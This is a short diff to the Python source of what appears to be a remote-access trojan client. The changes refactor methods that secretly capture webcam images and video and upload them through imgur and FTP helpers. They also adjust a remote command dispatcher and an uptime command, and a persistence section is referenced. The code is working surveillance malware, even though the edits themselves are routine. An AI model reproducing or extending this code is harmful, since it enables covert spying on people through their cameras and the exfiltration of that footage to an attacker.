@@ -563,7 +563,9 @@ class Client(object):
         waitKey(1)
         imwrite(tmp, f)
         dev.release()
-        self.result['webcam'][time.ctime()] = self._imgur(tmp)
+        result = self._imgur(tmp)
+        self.result['webcam'][time.ctime()] = result
+        return result
 
     def webcam_stream(self):
         dev = VideoCapture(0)
@@ -589,7 +591,9 @@ class Client(object):
             output.write(frame)
             if waitKey(0) and time.time() > end: break
         dev.release()
-        self.result['webcam'][time.ctime()] = self._ftp(fpath)
+        result = self._ftp(fpath)
+        self.result['webcam'][time.ctime()] = result
+        return result
 
 # ----------------- PERSISTENCE --------------------------
 
@@ -953,7 +957,7 @@ class Client(object):
     def cd(self, pathname): return os.chdir(pathname) if os.path.isdir(pathname) else os.chdir('.')
 
     @command
-    def get(self, target): return getattr(self, target)() if target in ('jobs','results','options','status','commands','modules','info') else '\n'.join(["usage: {:>16}".format("'get <option>'"), "options: {}".format("'jobs','results','options','status','commands','modules','info'")]) 
+    def get(self, target): return getattr(self, target)() if target in ['jobs','results','options','status','commands','modules','info'] else '\n'.join(["usage: {:>16}".format("'get <option>'"), "options: {}".format("'jobs','results','options','status','commands','modules','info'")]) 
 
     @command    
     def status(self): return '%d days, %d hours, %d minutes, %d seconds' % (int(time.clock()/86400.0), int((time.clock()%86400.0)/3600.0), int((time.clock()%3600.0)/60.0), int(time.clock()%60.0))
@@ -962,7 +966,7 @@ class Client(object):
 
 def main(*args, **kwargs):
     client = Client(**kwargs)
-    return client.start()
+    return client
 
 
 if __name__ == '__main__':
